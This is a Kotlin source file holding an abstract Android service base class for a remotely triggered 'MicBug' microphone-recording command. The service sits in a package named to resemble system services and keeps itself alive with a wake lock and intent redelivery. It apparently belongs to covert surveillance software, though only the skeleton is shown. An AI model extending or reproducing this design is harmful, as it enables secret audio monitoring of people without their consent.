package com.android.services.services.micBug

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.PowerManager
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.models.MicBugCommand
import com.android.services.util.Mp3LameRecorder
import io.reactivex.rxjava3.disposables.Disposable
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

abstract class MicBugCommandProcessingBaseI(
    val applicationContext: Context,
) : IBackgroundProcessing {

    internal val executorService: ExecutorService = Executors.newSingleThreadExecutor()
    internal var disposable: Disposable? = null
    internal var recorder: Mp3LameRecorder? = null
    internal lateinit var mFilePath: String
    internal var mRecordingStartTime: Long = 0
    internal var wakeLock: PowerManager.WakeLock? = null
    internal var micBugPush: MicBugCommand? = null
    internal var customData:String="1"

    companion object {
        internal const val TAG = "MicBug "
        internal const val TAG_MIC_BUG_WAKE_LOCK = "myApp:TOSMicBugWork"
        const val MIC_BUG_PUSH = "MIC_BUG_PUSH"
        internal const val INITIAL_DELAY = 0L
        internal const val PERIODIC_INTERVAL = 60 * 1000L
        internal var intervalConsumed: Int = 0
        internal const val MIC_BUG_NOTIFICATION_ID = 112

        @JvmStatic
        var micBugStatus: String? = null
    }

    abstract fun initialize()
    abstract fun parseIntent(intent: Intent?)
    abstract fun createOutputFilePath()
    abstract fun startRecording()
    abstract suspend fun stopRecording()
    abstract fun onServiceDestroy()

    override fun onCreate() {
        initialize()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createOutputFilePath()
        parseIntent(intent)
        return Service.START_REDELIVER_INTENT
    }

    override fun onDestroy() {
        onServiceDestroy()
    }
}